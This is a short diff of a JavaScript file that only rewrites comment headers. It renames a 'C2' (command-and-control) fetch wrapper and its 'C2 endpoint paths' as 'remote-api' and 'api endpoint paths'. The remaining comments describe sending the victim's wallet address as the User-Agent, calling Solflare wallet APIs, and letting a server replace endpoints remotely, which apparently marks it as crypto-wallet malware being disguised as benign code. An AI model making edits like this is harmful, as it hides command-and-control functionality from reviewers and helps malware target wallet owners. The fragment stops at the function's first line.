@@ -1,14 +1,14 @@
 /* ════════════════════════════════════════════════════════════
- * SECTION 5 — C2 FETCH WRAPPER + NOTIFICATION STRINGS
+ * SECTION 5 — remote-api FETCH WRAPPER + NOTIFICATION STRINGS
  * See docs/execution_flow.md and docs/backend_protocol.md.
  * See docs/ for full documentation.
  * ════════════════════════════════════════════════════════════ */
 
   /* ═══════════════════════════════════════════════════════════
-   * SECTION 5 — C2 FETCH WRAPPER + NOTIFICATION STRINGS
+   * SECTION 5 — remote-api FETCH WRAPPER + NOTIFICATION STRINGS
    * c2Fetch: adds C2_PATH_PREFIX, sets User-Agent=walletAddress,
    *   Authorization: Bearer <generateBearer()>, 3.5s timeout
-   * NOTIFY_STRINGS[0..9]: C2 endpoint paths + Solflare API URLs
+   * NOTIFY_STRINGS[0..9]: api endpoint paths + Solflare API URLs
    *   server can replace these via fetchLocale()
    * ═══════════════════════════════════════════════════════════ */
   c2Fetch = async function(_str_cache, __str_table__) {
